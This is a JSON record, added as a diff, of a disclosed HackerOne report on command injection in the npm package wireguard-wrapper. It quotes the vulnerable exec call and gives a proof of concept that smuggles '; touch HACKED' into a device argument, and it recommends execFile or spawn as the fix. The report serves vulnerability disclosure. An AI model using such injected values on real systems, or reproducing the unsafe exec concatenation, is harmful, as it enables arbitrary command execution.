@@ -1,0 +1,131 @@
+{
+  "id": 858674,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTg2NzQ=",
+  "url": "https://hackerone.com/reports/858674",
+  "title": "[wireguard-wrapper] Command Injection via insecure command concatenation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-24T14:07:08.104Z",
+  "submitted_at": "2020-04-24T14:07:08.104Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-04-16T21:23:42.350Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-03-17T21:23:27.027Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `wireguard-wrapper` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `wireguard-wrapper`\n**version:** `1.0.2`\n**npm page:** `https://www.npmjs.com/package/wireguard-wrapper`\n\n## Module Description\n\nThis project is a nodejs wrapper for the wireguard commands wg and wg-quick.\n\nFeatures:\n- No dependencies\n- Uses promises\n\nLimitations:\n- So far it can only read but not write anything\n- missing wg set, wg setconf, wg addconf, wg syncconf\n\n## Module Stats\n\n[0] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `wg showconf` functionality. \nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/rostwolke/node-wireguard-wrapper/blob/master/src/command/Wg.js#L58\n'use strict';\nconst {exec} = require('child_process');\n...\n\tstatic showconf(device){\n\t\treturn new Promise(function(resolve, reject){\n\t\t\tif(!device){\n\t\t\t\treturn reject('No device/interface specified');\n\t\t\t}\n\n\t\t\texec(`wg showconf ${device}`, function(error, stdout, stderr){\n\t\t\t\tif(error){\n\t\t\t\t\treturn reject(`Exec error: ${error}`);\n\t\t\t\t}\n\t\t\t\tif(stderr){\n\t\t\t\t\treturn reject(`StdErr: ${stderr}`);\n\t\t\t\t}\n    ....\n```\nAs we can see the `device` parameter is passed as input to the `exec` function.\n\nThe function `exec` is the build-in function `child_process.exec()` taking in input the `device` variable build with the unsecure user's input.\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install [`wireguard` tool](https://www.wireguard.com/install/) (even though it is not needed to show the vulnerability)\n- install `wireguard-wrapper` module:\n    -  `npm i --save wireguard-wrapper`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst { Wg } = require('wireguard-wrapper');\n\nWg.showconf('; touch HACKED').then(function(config){\n    console.log('wg0 configuration:', config);\n    console.log('generated configuration file:', config.toString());\n});\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n\n{F802322}\n\n\n## Patch\nDo not concatenate commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.exec`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `wireguard-wrapper` module via insecure command concatenation.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 802322,
+      "file_name": "poc_wireguard.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/XyuUxzy1Cd3sYbp9uSJv7YVe?response-content-disposition=attachment%3B%20filename%3D%22poc_wireguard.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_wireguard.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQVLL3MOL%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T173349Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHcaCXVzLXdlc3QtMiJHMEUCICXZ2t25W06qgJGfQEKgCHiLu2RwBCYfTtrgA3QZzFZjAiEA993Cf7iOatTQrB5x5IZxlmcwuY3LP%2Fa2bNKX4ASYmP0qsgUIQBADGgwwMTM2MTkyNzQ4NDkiDIEqMtXaoEpelmH7SCqPBXgJYEDkYwMAT0lhTX8qRa%2BqzeESV1rrpvOy%2B%2Bjcv%2BVfIEepp0Eq3HqN2NrCJhJhHfL%2FlVIW%2FFU1Nzp8sZ884kZpYumsSnbe9lZjARKcp4zyfvDNeudfC2haYUxbeBcmi10scQzjuqTT39xWW1Q%2F0Rij2kEsebFuSbUMe7KSHflFCUzZwPTopHlZ5okaWMJmjlNScPEDtkmyypxf8kAV9RNHug8RG%2FFRj3CZ8qcNIEneMW7L4r%2Bbc9Qe1FiwJnGuuugiRvWSUihQwu9dkkT7eMqjDdr4Q2YmKKzORy7YrxRR23ImvLw6aHUjIlu7zE4GbmwrY9g6eVZP%2FPHxHGd%2Bzbv14iMnmbbUUOeIaSJ9le4Sj8pBIRIgANs%2Fr34AK9GPtxrpmKMUzzOz8gaBxf0D5o2F9C0fxOF51mZvEutyCjUVgIlMTPyhQ%2BMP1FmPyvDtX%2FS9ClSPeZMJx3kptRriSnWTR98EvM8w3JXoCSR6EzcIfv8eOYxl9WbcxZWs%2FP7%2F3x0pWgfdAHT7qeBu6vbyXql4qypkowJp6vZLPX1jP%2BDXMaqMJzZs4UhYZe15j6wX99qHKRVQJoZHKJCwqarVX5dn3OeztUZUaqTzDRUiNCNMmd%2FECiaRP3V9JaUZ6afMqtNIlkbCvmkuQPCuiHnjJKJAjrSvx7TavC%2BQWhwCyo5l71X0wAPWUQEm4BcgcosaIvgb1s8kij8dth14zpM3d%2FmYKmPK5ORTuK4LllFLtMIDmpYQgGl7%2FgPjhodovfY2JeSpFWHh1gVJI9v4929bfLEGL3nRVjqM1Z8HQcL4WzNeCkQdtZ8IVpkxRNmfqu234ulN5MLeGiAc0B9elzqZHSKeBgXJGBHK%2BA9bOWF%2Br04wpabYzwY6sQFvFOv9hGQXzF%2B7IztrfF1YvNzhhZIz4vJscNSGXou%2FzQ92vv14JymGZk6XltXiB1sbY0m%2Bf8J4XSWtDJY3IL82BGAeUyLbJnjj35p9uJGkUcsUPXxMm7wTOV0O5z2aS30tvZxBw2WdhXHR06AXH5BQeiBXEfdSXzSt5El2Y7m6M9WNdUbYZiT9DfhUi1T5WvCNXTGsu3Raj7dUylHWfKKfFC1s0%2BLcRRM5P39b0qukX2Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=929b7426550286c0c101b4c99e0e2319390bec88819155fc811351ab63033d90",
+      "file_size": 2179464,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-04-16T21:23:27.159Z",
+  "allow_singular_disclosure_after": -159135022.6437475,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "battle_angel",
+    "yassinek3ch",
+    "bl4de",
+    "akashhamal0x01",
+    "biolanaira",
+    "crackernoob22",
+    "meispi",
+    "adass"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
